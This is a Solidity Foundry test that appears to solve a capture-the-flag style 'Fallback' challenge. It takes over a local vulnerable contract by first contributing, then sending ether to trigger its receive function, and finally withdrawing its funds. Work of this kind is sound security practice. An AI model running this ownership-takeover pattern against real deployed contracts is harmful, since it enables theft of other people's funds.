// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackExploitTest is Test {
    Fallback public target;
    address constant OWNER = address(0xCAFE);
    address constant ATTACKER = address(0xBEEF);

    function setUp() public {
        vm.prank(OWNER);
        target = new Fallback();

        vm.deal(ATTACKER, 1 ether); 
    }

    function testExploit() public {
        
        // Step 1: Contribut small amount to be in contributions mapping
        vm.startPrank(ATTACKER);
        target.contribute{value: 0.00001 ether}();

        // Step 2: Send ether to trigger receive function and become owner
        (bool success, ) = address(target).call{value: 0.0001 ether}(""); 
        require(success, "Call failed");

        // Step 3: Attacker should now be the owner
        assertEq(target.owner(), ATTACKER, "Attacker is not the owner");
        vm.stopPrank();

        // Step 4: Withdraw funds as the new owner
        uint256 initialAttackerBalance = ATTACKER.balance;
        console.log('ATTACKER BALANCE NOW:', ATTACKER.balance);
        vm.prank(ATTACKER);
        target.withdraw();
        assertGt(ATTACKER.balance, initialAttackerBalance, "Attacker did not receive funds");
        console.log('ATTACKER BALANCE NOW:', ATTACKER.balance);
    }
}